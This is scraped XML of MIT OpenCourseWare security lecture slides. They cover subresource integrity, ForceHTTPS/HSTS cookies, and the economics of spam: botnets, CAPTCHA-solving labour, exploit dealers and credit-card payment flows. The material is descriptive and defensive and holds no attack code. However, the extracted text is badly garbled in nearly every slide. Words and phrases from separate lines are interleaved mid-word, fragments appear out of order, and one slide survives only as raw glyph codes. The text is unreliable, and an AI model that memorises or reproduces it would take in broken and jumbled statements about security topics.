URL	&#13; is	&#13; non -HTTPS,	&#13; adversary	&#13; can	&#13; tamper	&#13; with	&#13; HTTP	&#13; response.	&#13; But,	&#13; if	&#13; the	&#13; 
	&#13; Alternative	&#13; approach:	&#13; explicitly	&#13; authenticate	&#13; embedded	&#13; elements.	&#13; 
 E.g.,	&#13; could
o 
o Prevents	&#13; an	&#13; adversary	&#13; from	&#13; tampering	&#13; with	&#13; response.	&#13; 	&#13; include	&#13; a	&#13; hash	&#13; of	&#13; the	&#13; Javascript	&#13; code	&#13; being	&#13; loaded. 	&#13; 
 
o t	&#13; beDoes	&#13; 
	&#13; deplonot
4	&#13; (B).	&#13; ProtectinMigh
Ref:	&#13; http://www.w
g	&#13; cookies.	&#13; y	&#13; 
erequ
d	&#13; in	&#13; brire	&#13; 
ofu
wsll	&#13; 
eHTTPS
rs	&#13; in	&#13; th.	&#13; 
e
	&#13; 3.org/TR/e
SRI	&#13; ne
/ar
	&#13; 	&#13; futur . 	&#13; 
5</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>/g15/g41/g46/g1/g40/g31/g29/g31/g45/g45/g27/g44/g51/g1/g32/g41/g44/g1/g71/g75/g1/g27/g45/g45/g47/g39/g35/g40/g33/g1/g46/g34/g31/g1/g49/g31/g28/g1/g30/g31/g48/g31/g38/g41/g42/g31/g44/g1/g40/g31/g48/g31/g44/g1/g39/g27/g37/g31/g45/g1/g27/g1/g39/g35/g45/g46/g27/g37/g31/g57/g1
 /g20/g46/g35/g38/g38/g1/g34/g31/g38/g42/g32/g47/g38/g1/g32/g41/g44
o 
o /g14/g27/g44/g37/g35/g40/g33/g1/g29/g1/g71/g76/g57
/g41/g41/g1
/g2/g29/g46/g35/g48/g31/g1/g27/g46/g46/g27/g29/g37/g31/g44/g1/g29/g27/g40/g1/g45/g31/g44/g48/g31/g1/g32/g27/g37/g31/g1/g45/g31/g46/g1/g27/g46/g1/g37/g35/g31/g45/g1/g27/g45/g1/g20/g31/g29/g47/g44/g31/g1/g33/g35/g48/g31/g45/g1/g29/g41/g40/g32/g35/g30/g31/g40/g46
/g34/g46/g46/g42/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g35/g27/g38/g35/g46/g51/g54/g1/g28/g47/g46/g1/g40/g41/g46
/g54/g1/g27/g40/g30/g1/g45/g31/g46/g1/g29/g41/g41/g37/g35/g31/g45/g1/g35/g40/g46/g31/g33/g44/g35/g46/g51/g57/g1
/g34/g46/g46/g42/g45/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g57/g1/g61/g34/g46/g46/g42/g45/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g1/g29/g27/g40/g40/g41/g46/g1/g30/g35/g45/g46/g35/g40/g33/g47/g35/g45/g34/g62/g1/g1/g32/g41/g44/g1
/g1
/g24/g34/g51/g1/g40/g41/g46/g1/g36/g47/g45/g46/g1/g46/g47/g44/g40/g1/g41/g40/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g32/g41/g44/g1/g31/g48/g31/g44/g51/g41/g40/g31/g59/g1
 /g9/g21/g21/g17/g20/g1/g45/g35/g46/g31/g1/g39/g35/g33/g34/g46/g1/g40/g41/g46/g1/g31/g50/g35/g45/g46/g57/g1
 /g10/g32/g1/g35/g46/g1/g30/g41/g31/g45/g54/g1/g39/g35/g33/g34/g46/g1/g40/g41/g46/g1/g28/g31/g1/g46/g34/g31/g1/g45/g27/g39/g31/g1/g45/g35/g46/g31/g1/g61/g34/g46/g46/g42/g45/g56/g60/g60/g49/g31/g28/g57/g39/g35/g46/g57/g31/g30/g47/g1/g35/g45/g1/g27/g47/g46/g34/g31/g40/g46/g35/g29/g27/g46/g31/g30/g54/g1/g28/g47/g46/g1
/g34/g46/g46/g42/g56/g60/g60/g49/g31/g28/g57/g39/g35/g46/g57/g31/g30/g47/g1/g35/g45/g40/g68/g46/g62/g57/g1
 /g9/g21/g21/g17/g20/g1/g42/g27/g33/g31/g1/g39/g27/g51/g1/g31/g50/g42/g31/g29/g46/g1/g47/g45/g31/g44/g45/g1/g46/g41/g1/g29/g38/g35/g29/g37/g1/g46/g34/g44/g41/g47/g33/g34/g1/g61/g45/g31/g38/g32/g58/g45/g35/g33/g40/g31/g30/g1/g29/g31/g44/g46/g45/g62/g57/g1
/g1
/g10/g39/g42/g38/g31/g39/g31/g40/g46/g35/g40/g33/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g57/g1
 /g21/g34/g31/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g28 /g35/g46/g1/g35/g45/g1/g45/g46/g41/g44/g31/g30/g1/g35/g40/g1/g27/g1/g29/g41/g41/g37/g35/g31/g57/g1
 /g10/g40/g46/g31/g44/g31/g45/g46/g35/g40/g33/g1/g35/g45/g45/g47/g31/g45/g56/g1
o /g20/g46/g27/g46/g31/g1/g31/g50/g34/g27/g47/g45/g46/g35/g41/g40/g1/g61/g46/g34/g31/g1/g7 /g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g29/g41/g41/g37/g35/g31/g1/g33/g31/g46/g46/g35/g40/g33/g1/g31/g48/g35/g29/g46/g31/g30/g62/g57/g1
o /g5/g31/g40/g35/g27/g38/g1/g41/g32/g1/g45/g31/g44/g48/g35/g29/g31/g1/g61/g32/g41/g44/g29/g31/g1/g31/g40/g46/g35/g44/g31/g1/g30/g41/g39/g27/g35/g40/g55/g1/g32/g41/g44/g29/g31/g1/g48/g35/g27/g1/g11/g20/g55/g1/g32/g41/g44/g29/g31/g1/g48/g35/g27/g1/g9/g21/g21/g17/g62/g57/g1
/square4 /g24/g34/g51/g1/g30/g41/g31/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g41/g40/g38/g51/g1/g27/g38/g38/g41/g49/g1/g45/g42/g31/g29/g35/g32/g35/g29/g1/g34/g41/g45/g46/g45/g54/g1/g35/g40/g45/g46/g31/g27/g30/g1/g41/g32/g1/g31/g40/g46/g35/g44/g31/g1
/g30/g41/g39/g27/g35/g40/g59/g1
/square4 /g24/g34/g51/g1/g30/g41/g31/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g44/g31/g43/g47/g35/g44/g31/g1/g29/g41/g41/g37/g35/g31/g1/g46/g41/g1/g28/g31/g1/g45/g31/g46/g1/g48/g35/g27/g1/g34/g31/g27/g30/g31/g44/g45/g1/g27/g40/g30/g1
/g40/g41/g46/g1/g48/g35/g27/g1/g11/g20/g59/g1
/square4 /g24/g34/g51/g1/g30/g41/g31/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g44/g31/g43/g47/g35/g44/g31/g1/g29/g41/g41/g37/g35/g31/g1/g46/g41/g1/g28/g31/g1/g45/g31/g46/g1/g48/g35/g27/g1/g9/g21/g21/g17/g20/g54/g1/g40/g41/g46/g1
/g9/g21/g21/g17/g59/g1
o /g3/g41/g41/g46/g45/g46/g44/g27/g42/g42/g35/g40/g33/g1/g61/g34/g41/g49/g1/g46/g41/g1/g33/g31/g46/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g28/g35/g46/g55/g1/g34/g41/g49/g1/g46/g41/g1/g27/g48/g41/g35/g30/g1/g42/g44/g35/g48/g27/g29/g51/g1/g38/g31/g27/g37/g45/g62/g57/g1
/square4 /g17/g41/g45/g45/g35/g28/g38/g31/g1/g45/g41/g38/g47/g46/g35/g41/g40/g1/g73/g56/g1/g5/g15/g20/g20/g6/g4/g57/g1
/square4 /g17/g41/g45/g45/g35/g28/g38/g31/g1/g45/g41/g38/g47/g46/g35/g41/g40/g1/g74/g56/g1/g31/g39/g28/g31/g30/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g28/g35/g46/g1/g35/g40/g1/g22/g19/g13/g1/g40/g27/g39/g31/g1/g61/g35/g32/g1/g42/g41/g45/g45/g35/g28/g38/g31/g62/g57/g1
/square4 /g10/g32/g1/g46/g34/g31/g44/g31/g68/g45/g1/g27/g1/g49/g27/g51/g1/g46/g41/g1/g33/g31/g46/g1/g45/g41/g39/g31/g1/g27/g47/g46/g34/g31/g40/g46/g35/g29/g27/g46/g31/g30/g1/g28/g35/g46/g45/g1/g32/g44/g41/g39/g1/g45/g31/g44/g48/g31/g44/g1/g41/g49/g40/g31/g44/g1
/g61/g5/g15/g20/g20/g6/g4/g54/g1/g22/g19/g13/g1/g40/g27/g39/g31/g54/g1/g31/g46/g29/g62/g54/g1/g45/g34/g41/g47/g38/g30/g1/g49/g31/g1/g36/g47/g45/g46/g1/g33/g31/g46/g1/g46/g34/g31/g1/g42/g47/g28/g38/g35/g29/g1/g37/g31/g51/g1
/g30/g35/g44/g31/g29/g46/g38/g51/g59/g1
/square4 /g5/g35/g32/g32/g35/g29/g47/g38/g46/g35/g31/g45/g56/g1/g47/g45/g31/g44/g45/g1/g34/g27/g48/g31/g1/g47/g40/g44/g31/g38 /g35/g27/g28/g38/g31/g1/g40/g31/g46/g49/g41/g44/g37/g45/g57/g1/g3/g44/g41/g49/g45/g31/g44/g45/g1/g27/g44/g31/g1
/g47/g40/g49/g35/g38/g38/g35/g40/g33/g1/g46/g41 /g1/g28/g38/g41/g29/g37/g1/g46/g34/g31/g1/g34/g27/g40/g30/g45/g34/g27 /g37/g31/g1/g41/g40/g1/g27/g1/g45/g35/g30/g31/g58/g29/g34/g27/g40/g40/g31/g38/g1/g44/g31/g43/g47/g31/g45/g46/g57/g1
/g1
/g4/g47/g44/g44/g31/g40/g46/g1/g45/g46/g27/g46/g47/g45/g1/g41/g32/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g57/g1
 /g20/g41/g39/g31/g1/g35/g30/g31/g27/g45/g1/g32/g44/g41/g39/g1/g7/g41/g44/g29/g31/g9 /g21/g21/g17/g20/g1/g34/g27/g48/g31/g1/g28/g31/g31/g40/g1/g27/g30/g41/g42/g46/g31/g30/g1/g35/g40/g46/g41/g1/g45/g46/g27/g40/g30/g27/g44/g30/g45/g57/g1
 /g9/g21/g21/g17/g1/g20/g46/g44/g35/g29/g46/g58/g21/g44/g27/g40/g45/g42/g41/g44/g46/g58/g20/g31/g29/g47/g44/g35/g46/g51/g1/g34/g31/g27/g30/g31/g44/g1/g35/g45/g1/g45/g35/g39/g35/g38/g27/g44/g1/g46/g41/g1/g27/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g29/g41/g41/g37/g35/g31/g57/g1
o /g19/g31/g32/g56/g1/g34/g46/g46/g42/g56/g60/g60/g46/g41/g41/g38/g45/g57/g35/g31/g46/g32/g57/g41/g44/g33/g60/g34/g46/g39/g38/g60/g44/g32/g29/g78/g79/g81/g79/g1
o /g19/g31/g32/g56/g1/g34/g46/g46/g42/g56/g60/g60/g31/g40/g57/g49/g35/g37/g35/g42/g31/g30/g35/g27/g57/g41/g44/g33/g60/g49/g35/g37/g35/g60/g9/g21/g21/g17/g67/g20/g46/g44/g35/g29/g46/g67/g21/g44/g27/g40/g45/g42/g41/g44/g46/g67/g20/g31/g29/g47/g44/g35/g46/g51 /g1
 /g22/g45/g31/g45/g1/g34/g31/g27/g30/g31/g44/g1/g35/g40/g45/g46/g31/g27/g30/g1/g41/g32/g1/g39/g27/g33/g35/g29/g1/g29/g41/g41/g37/g35/g31/g56/g1
o /g20/g46/g44/g35/g29/g46/g58/g21/g44/g27/g40/g45/g42/g41/g44/g46/g58/g20/g31/g29/g47/g44/g35/g46/g51/g56/g1/g39/g27/g50/g58/g27/g33/g31/g84/g79/g80/g80/g76/g72/g72/g72/g55/g1/g35/g40/g29/g38/g47/g30/g31/g20/g47/g28/g5/g41/g39/g27/g35/g40/g45/g1
 /g21/g47/g44/g40/g45/g1/g9/g21/g21/g17/g1/g38 /g35/g40/g37/g45/g1/g35/g40/g46/g41/g1/g9/g21/g21/g17/g20/g1/g38/g35/g40/g37/g45/g57/g1

 /g17/g44/g41/g34/g35/g28/g35/g46/g45/g1/g47/g45/g31/g44/g1/g32/g44/g41/g39/g1/g41/g48/g31/g44/g44/g35/g30/g35/g40/g33/g1/g20/g20/g13/g60/g21/g13/g20/g1/g31/g44/g44/g41/g44/g45/g1/g61/g31/g57/g33/g57/g54/g1/g28/g27/g30/g1/g29/g31/g44/g46/g35/g32/g35/g29/g27/g46/g31/g62/g57/g1
 /g16/g42/g46/g35/g41/g40/g27/g38/g38/g51/g1/g27/g42/g42/g38/g35/g31/g45/g1/g46/g41/g1/g27/g38/g38/g1/g45/g47/g28/g30/g41/g39/g27/g35/g40/g45/g57/g1
o /g24/g34/g51/g1/g35/g45/g1/g46/g34/g35/g45/g1/g47/g45/g31/g32/g47/g38/g59/g1
o /g40/g41/g40/g58/g20/g31/g29/g47/g44/g31/g1/g27/g40/g30/g1/g32/g41/g44/g33/g31/g30/g1/g29/g41/g41/g37/g35/g31/g45/g1/g29/g27/g40/g1/g28/g31/g1/g38/g31/g27/g37/g31/g30/g1/g41/g44/g1/g45/g31/g46/g1/g41/g40/g1/g45/g47/g28/g30/g41/g39/g27/g35/g40/g45/g57/g1
7</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-7-sandboxing-native-code/</video_url>
          <video_title>Lecture 7: Sandboxing Native Code </video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Security Economics (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec23/</lecture_pdf_url>
      <lectureno>23</lectureno>
      <slides>
        <slide>
          <slideno>5</slideno>
          <text>Q:A:	&#13; Depends	&#13; on	&#13; the	&#13; registrar	&#13; or	&#13; hosting	&#13; provider	&#13; H
oo
 w	&#13; difficult	&#13; is	&#13; it	&#13; to	&#13; take	&#13; down 	&#13; individual	&#13; domain	&#13; nam
	&#13; [see	&#13; Figures	&#13; or	&#13; w
oOnly	&#13; a	&#13; few	&#13; number	&#13; of	&#13; registrars	&#13; host	&#13; domains	&#13; for	&#13; many	&#13; affiliates;	&#13; es	&#13; 3,	&#13; 4,	&#13; 5	&#13; in	&#13; the	&#13; papereb	&#13; servers?	&#13; 
].	&#13; 
 similarly,	&#13; only	&#13; a	&#13; few	&#13; number	&#13; of	&#13; ASes	&#13; host	&#13; web	&#13; servers	&#13; for	&#13; many	&#13; affiliates.	&#13; 
o Only	&#13; a	&#13; f
across	&#13; many	&#13; registrars	&#13; and	&#13; ASes.	&#13; ew	&#13; affiliates	&#13; distribute 	&#13; their	&#13; domain,	&#13; name	&#13; server,	&#13; and	&#13; web	&#13; server	&#13; 
Bullet -proof
	&#13; they're	&#13; taken	&#13; d	&#13; hos
oting	&#13; pr
wn,	&#13; theovid
y'reer
	&#13; res
lati	&#13; are
v	&#13; more	&#13; expensive,	&#13; but	&#13; plentiful;	&#13; even	&#13; 
ely	&#13; easy	&#13; to	&#13; replace.	&#13; if	&#13; 
Wh1)at	&#13; h
User	&#13; pays	&#13; for	&#13; goods.appens	&#13; during	&#13; the	&#13; real ization	&#13; phase?	&#13; 
2)	&#13;  
 User	&#13; receives	&#13; goods	&#13; in	&#13; the	&#13; mail	&#13; (or	&#13; downloads	&#13; software).	&#13; 	&#13; 
Payment	&#13; protocol:	&#13; almost	&#13; invariably	&#13; credit	&#13; cards.	&#13; 
 
 
CustomerCredit	&#13; ca
 rd	&#13; info	&#13; travels	&#13; along	&#13; this	&#13; flow: 	&#13; 
|----&gt;Merchant 
|----&gt; Payment processor (helps the 
|  merchant deal with the 
|  payment protocol) 
| 
|--&gt;Acquiring bank (merchant's) |--&gt;Association network 
| (e.g., Visa) | 
	&#13; |---&gt; Issuing bank 
(customer's)
 
 apprThe	&#13; issuing	&#13; b
oval	&#13; back.ank
	&#13; 	&#13; decides	&#13; whether	&#13; t 
he	&#13; transaction 	&#13; looks	&#13; legit,	&#13; and	&#13; if	&#13; so,	&#13; sends	&#13; an	&#13; 
	&#13; PharmaLeaks	&#13; paper:	&#13; Some	&#13; programs	&#13; have	&#13; over	&#13; $10M/yr	&#13; revenue!	&#13; 
For	&#13; 
is	&#13; ca
 p
llhysica
ed	&#13; "drl
op	&#13; shipping").	&#13; goods,	&#13; the	&#13; sup
	&#13; plier	&#13; typically	&#13; ships 	&#13; the	&#13; goods	&#13; directly	&#13; to	&#13; purchaser	&#13; (this	&#13; 
 Drop	&#13; shipping	&#13; means	&#13; that	&#13; the	&#13; affiliate	&#13; program	&#13; 
physic al	&#13; products	&#13; themselves.	&#13; does	&#13; not	&#13; need	&#13; to	&#13; stockpile	&#13; 
Authors	&#13; speculate	&#13; that	&#13; there	&#13; are	&#13; plenty	&#13; of
bottleneck. 	&#13; 	&#13; suppliers,	&#13; so	&#13; there's	&#13; no	&#13; supply -side	&#13; 
	&#13; Q:	&#13; Why	&#13; do	&#13; spammers	&#13; properly	&#13; classify	&#13; their
A:	&#13; The	&#13; association	&#13; network	&#13; (e.g.,	&#13; Visa	&#13; or	&#13; Mastercard)	&#13; 	&#13; credit	&#13; card	&#13; t
charges	&#13; high	&#13; finransactions?
es	&#13; for	&#13; 	&#13; 
trmiscoded	&#13; transactions!
ouble	&#13; for	&#13; obs i	&#13; Presumably,	&#13; association	&#13; networks	&#13; don't	&#13; want	&#13; to
	&#13; cur ng	&#13; the	&#13; true	&#13; purposes 	&#13; of	&#13; financial	&#13; transactions. 	&#13; 	&#13; get	&#13; in	&#13; 
Q:	&#13; Why	&#13; do	&#13; spammers	&#13; actually	&#13; ship	&#13; the	&#13; goods?	&#13; 
6</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>Spammers	&#13; typically	&#13; work	&#13; on	&#13; a	&#13; commission,	&#13; 
thegetting	&#13; 30%--50%	&#13; of	&#13; the	&#13; money	&#13; that	&#13; 
	&#13; y	&#13; bring	&#13; in.	&#13; 
Nexthem.	&#13; t,	&#13; we'll	&#13; discuss	&#13; these	&#13; three	&#13; steps	&#13; in	&#13; detail, 	&#13; and	&#13; look	&#13; at 	&#13; possible	&#13; ways	&#13; to	&#13; disrupt	&#13; 
	&#13; Advertising:	&#13; H
 ow	&#13; do	&#13; you	&#13; get	&#13; a	&#13; user	&#13; to	&#13; click	&#13; on	&#13; a	&#13; li
 spam,	&#13; spam	&#13; Typical	&#13; approach:	&#13; send	&#13; email	&#13; spam.	&#13; [Other	&#13; methods	&#13; also	&#13; work:	&#13; blog/comment	&#13; nk?	&#13; 
Cost	&#13; of	&#13; sending	&#13; spam:	&#13; $60	&#13; per	&#13; million	&#13; spam	&#13; messages,	&#13; at	&#13; 
o in	&#13; social	&#13; networks,	&#13; ...] 	&#13; 
o Actual	&#13; costs	&#13; are	&#13; much	&#13; lower	&#13; for	&#13; direct	&#13; operators	&#13; of	&#13; a	&#13; spam	&#13; botnet.	&#13; retail.	&#13; 
o Delivery	&#13; and	&#13; click	&#13; rates	&#13; for	&#13; spam	&#13; emails	&#13; are	&#13; quite	&#13; low,	&#13; so	&#13; sending	&#13; spam	&#13; 
ha
Earlier	&#13; study	&#13; by	&#13; some	&#13; of	&#13; the	&#13; same	&#13; guys:	&#13; s	&#13; t
 o	&#13; be	&#13; really	&#13; cheap	&#13; in	&#13; order	&#13; to	&#13; be 	&#13; profitable.	&#13; 
 
 ~350	&#13; million	&#13; spams	&#13; sent 	&#13; 
How	&#13; can	&#13; we	&#13; make	&#13; sending	&#13; spam	&#13; more	&#13; expensive?	&#13; 
o ~10k	&#13; clicks,	&#13; 28	&#13; purchase	&#13; attempts	&#13; 
o IPIPs-le
.	&#13; vel	&#13; blacklists:	&#13; Used	&#13; to	&#13; work	&#13; for	&#13; a 	&#13; while,	&#13; but	&#13; only	&#13; if	&#13; adversary	&#13; has	&#13; few	&#13; 
Charging	&#13; for	&#13; sending	&#13; email?	&#13; 
 
 
 Old	&#13; idea,	&#13; in	&#13; various	&#13; forms:	&#13; money,	&#13; computation,	&#13; CCa
Win
ll	&#13; th	&#13; this	&#13; work?	&#13; How	&#13; could	&#13; we	&#13; get	&#13; everyone 	&#13; to	&#13; adoAPTC
pt	&#13; thisH
	&#13; at	&#13; oAs.	&#13; 
is	&#13; work	&#13; even	&#13; if	&#13; everyone	&#13; adopts 	&#13; at	&#13; once?	&#13; What	&#13; if	&#13; user	&#13; nce?	&#13; 
devices	&#13; are	&#13; compromised?	&#13; [But	&#13; even	&#13; with	&#13; compromised	&#13; 
high	&#13; enough	&#13; of	&#13; adesk
reducharging	&#13; per	&#13; message	&#13; may	&#13; be	&#13; 
ce	&#13; spam,	&#13; since	&#13; generating	&#13; spam	&#13; needs	&#13; to	&#13; be	&#13; 	&#13; ba
very	&#13; cheap	&#13; tr	&#13; to	&#13; greatly	&#13; tops,	&#13; 
 profitable!] 	&#13; o	&#13; be	&#13; 
Three	&#13; w
o 
o ork
CLa
ompromised	&#13; webmail	&#13; accounts	&#13; give	&#13; access	&#13; to	&#13; rg
ea
-scale	&#13; botnets	&#13; give	&#13; access	&#13; to	&#13; many	&#13; IP	&#13; rounds	&#13; for	&#13; adversary: 	&#13; 
 addr
spesses. 	&#13; 
o ecial	&#13; IP	&#13; addresses. 	&#13; 

	&#13;  	&#13; 
Still,	&#13; worHijack	&#13; IP	&#13; addresses	&#13; (using	&#13; BGP	&#13; announcements).	&#13; Yahoo,	&#13; Gmail,	&#13; Hotmail	&#13; cannot	&#13; be	&#13; blacklisted.
o Cost	&#13; of	&#13; sending	&#13; spam	&#13; used	&#13; to	&#13; be	&#13; even	&#13; lower	&#13; karounds	&#13; are	&#13; not	&#13; free,	&#13; and	&#13; they	&#13; incur	&#13; some	&#13; costs	&#13; for	&#13; the	&#13; spammer.	&#13; 
before	&#13; IP -level	&#13; blacklists.	&#13; 
Botnets	&#13; are	&#13; often	&#13; used	&#13; to	&#13; send	&#13; spam.	&#13; [Draw	&#13; picture]	&#13; 
 Typica
o 
o l
Many	&#13; compromised	&#13; end-user	&#13; machines	&#13; that	&#13; C	&#13; architecture 	&#13; 
ommand	&#13; &amp;	&#13; control	&#13; (C&amp;C)	&#13; server/infrastructure	&#13; for	&#13; sending	&#13; commands	&#13; run	&#13; the	&#13; botnet	&#13; software. 	&#13; 
o 
 toBots	&#13; periodically	&#13; get	&#13; new	&#13; tasks	&#13; from	&#13; C	&#13; bots.	&#13; 
Individual	&#13; bot	&#13; machines	&#13; have	&#13; a	&#13; variet
o y	&#13; of	&#13; useful&amp;C
	&#13; 	&#13; 
resouinfrast
rces:ruct
	&#13; ure.	&#13; 
o Physical:	&#13; IP	&#13; address	&#13; (good	&#13; for	&#13; sending	&#13; spam),	&#13; cycles.	&#13; network	&#13; bandwidth,	&#13; CPU	&#13; 
Data:	&#13; email	&#13; contacts	&#13; (good	&#13; for	&#13; sending	&#13; spam),	&#13; credit	&#13; card	&#13; numbers,	&#13; .	&#13; .	&#13; .	&#13; 
3</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>o 
o Also,	&#13; C
the	&#13; carhinese	&#13; mobile	&#13; carriers	&#13; earn	&#13; money	&#13; from	&#13; each	&#13; spam	&#13; message,	&#13; 
Carriers	&#13; rie
definrs	&#13; hav
e	&#13; spe	&#13; an	&#13; i
ecianc
normal	&#13; limits	&#13; on	&#13; how	&#13; many	&#13; messages	&#13; lentive	&#13; to 	&#13; allow	&#13; the	&#13; spam	&#13; to	&#13; continue.	&#13; so	&#13; 
	&#13; "106 -prefix"	&#13; numbers	&#13; that	&#13; are	&#13; exempt	&#13; from	&#13; 
to	&#13; contact	&#13; employees),	&#13; but	&#13; 55%	&#13; of	&#13; Care	&#13; supposed	&#13; to	&#13; be	&#13; used	&#13; for 	&#13; non-commercial	&#13; reasons	&#13; (e.g.they	&#13; can	&#13; send	&#13; a	&#13; day
,	&#13; for.	&#13; 106
	&#13; companies	&#13; -numbers	&#13; 
hinese	&#13; text	&#13; message	&#13; spam	&#13; comes	&#13; 
	&#13;  Ref:	&#13; The	&#13; Economist,	&#13; "Spam	&#13; messaging:	&#13; from	&#13; 106	&#13; numbers.	&#13; 
 106	&#13; ways	&#13; to	&#13; annoy."	&#13; November	&#13; 29,	&#13; 2014	&#13; 
There	&#13; are	&#13; many	&#13; companies	&#13; which	&#13; trade	&#13; in	&#13; "cyber	&#13; arms."	&#13; Ex:	&#13; Endgame.	&#13; 
o 
o lo$1.5	&#13; million:	&#13; Endgame	&#13; will	&#13; give	&#13; you	&#13; the	&#13; 
cations	&#13; of	&#13; millions	&#13; of	&#13; unpatched	&#13; machines.	&#13; IP	&#13; addresses	&#13; and	&#13; physical	&#13; 
*$2.5	&#13; million:	&#13; Endgame	&#13; will	&#13; sell	&#13; you	&#13; a	&#13; 
which 	&#13; will	&#13; give	&#13; you	&#13; 25	&#13; exploits	&#13; a	&#13; year. 	&#13; "zero-day	&#13; subscription	&#13; package"	&#13; 
	&#13; 
o Who	&#13; buys	&#13; exploits	&#13; from	&#13; cyber	&#13; arms	&#13; 
(e.g., 	&#13; for	&#13; "hack-back"	&#13; schemes)?	&#13; ?	&#13; dealers?	&#13; Governments?	&#13; Companies	&#13; 
	&#13; There's	&#13; a	&#13; marketplace	&#13; for	&#13; buying	&#13; and	&#13; selling	&#13; can	&#13; use
 	&#13; for	&#13; evil	&#13; purposes. 	&#13; all	&#13; kinds	&#13; of	&#13; resources	&#13; that	&#13; attackers	&#13; 
Compromised	&#13; systems	&#13; 
o 
o Entire	&#13; compromised	&#13; machine.	&#13; 
o Access	&#13; to	&#13; a	&#13; compromised	&#13; web	&#13; site	&#13; (e.g.,	&#13; post	&#13; spam,	&#13; links,	&#13; redirectors,	&#13; 
o malware).	&#13; 
 C
Running	&#13; a	&#13; serompromised	&#13; email	&#13; accounts	&#13; (e.g.,	&#13; Gmail).	&#13; 
-Tool
o s	&#13; vice	&#13; on	&#13; an	&#13; existing	&#13; botnet 	&#13; (spam,	&#13; DoS).	&#13; 
o 
 MalwarBugs,	&#13; exploe	&#13; kits
-Stolen	&#13; information	&#13; its	&#13; 
o 	&#13; 
	&#13; SSNs,	&#13; credit	&#13; cards	&#13; numbers,	&#13; email	&#13; addresses,	&#13; etc.	&#13; 
This	&#13; pa
off	&#13; goods,
 per	&#13; foc
	&#13; and	&#13; software).	&#13; There	&#13; are	&#13; three	&#13; main	&#13; steps:uses	&#13; on	&#13; the	&#13; spam	&#13; ecosystem	&#13; (in	&#13; particular
	&#13; ,	&#13; the	&#13; sales	&#13; of	&#13; drugs,	&#13; knock -
1)
 Advertising:	&#13; Somehow	&#13; getting	&#13; a	&#13; user	&#13; to	&#13; 
3)2) 
RealClick
ization:	&#13; Allowing	&#13; the	&#13; user	&#13; to	&#13; buy	&#13; something,	&#13; send	&#13; money,	&#13; and	&#13; then	&#13; receive	&#13; 	&#13; support:	&#13; Presenting	&#13; a	&#13; web	&#13; site	&#13; thatcl
	&#13; wiick
ll	&#13; be	&#13; on	&#13; a	&#13; l
	&#13; theink
	&#13; tar.	&#13; 
get	&#13; of	&#13; a	&#13; click. 	&#13; 
product.	&#13; a	&#13; 
	&#13; 
Ultimately,	&#13; money	&#13; comes	&#13; from	&#13; the	&#13; last	&#13; part	&#13; 
something.	&#13; 
 in	&#13; this	&#13; chain,	&#13; when	&#13; the	&#13; user	&#13; buys	&#13; 
Many	&#13; components	&#13; are	&#13; outsourced	&#13; or	&#13; supported
bacspammers	&#13; work	&#13; 
kend	&#13; stuff	&#13; (e.g.,	&#13; was	&#13; th
orke	&#13; ad
ing	&#13; wverti
its
h	&#13; bers
a,	&#13; but	&#13; th
nks).	&#13; e	&#13; affiliate	&#13; via	&#13; affiliate	&#13; programs:	&#13; 
s	&#13; handle	&#13; most/all	&#13; of	&#13; the	&#13; Since	&#13; it's	&#13; rar e	&#13; to	&#13; get	&#13; caught,	&#13; spam	&#13; cars	&#13; are	&#13; a	&#13; lucrative	&#13; business.	&#13; 
2</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Why	&#13; are	&#13; webmail	&#13; accounts	&#13; so	&#13; cheap?	&#13; What	&#13; happened
 Adversaries	&#13; build	&#13; services	&#13; to	&#13; solve	&#13; C
o APTCH	&#13; to	&#13; CAPTCHAs?	&#13; 
o Turns	&#13; out	&#13; to	&#13; be	&#13; quite	&#13; cheap: 	&#13; ~$0.001As;	&#13; it's	&#13; just	&#13; a	&#13; matter	&#13; of	&#13; money.	&#13; 
Surprisingly,	&#13; it's	&#13; mostly	&#13; done	&#13; by	&#13; humans:	&#13; 	&#13; per	&#13; CAPTCHA,	&#13; with	&#13; low	&#13; latency.	&#13; 
wo
Mecrk	&#13; to
hani	&#13; any
cal	&#13; T	&#13; count
urk:	&#13; It'ry	&#13; w
s	&#13; a	&#13; it
crowh	&#13; cheap	&#13; l
d-souab	&#13; th
r rerced	&#13; or.	&#13; [Coulattacker	&#13; can	&#13; outsource e	&#13; 
 wo k	&#13; on	&#13; tasks	&#13; that	&#13; a 	&#13; difficult	&#13; for	&#13; computers	&#13; to	&#13; perform.]	&#13; web	&#13; service	&#13; d	&#13; also 	&#13; use	&#13; Amazon's	&#13; 
that	&#13; allows 	&#13; humans	&#13; to	&#13; 
